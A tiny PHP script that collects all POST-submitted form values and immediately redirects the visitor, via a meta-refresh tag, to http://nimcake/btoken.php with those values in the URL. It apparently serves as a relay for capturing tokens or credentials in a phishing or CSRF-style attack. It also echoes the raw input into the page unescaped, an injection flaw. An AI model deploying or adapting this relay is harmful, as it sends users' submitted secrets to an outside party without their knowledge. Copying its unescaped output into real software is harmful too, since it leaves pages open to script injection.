<?php
$p = "";
if (isset($_POST)) {
	$p = implode($_POST);
}
echo "<head><meta http-equiv=\"refresh\" content=\"0; url=http://nimcake/btoken.php?p=".$p."\" /></head>";
?>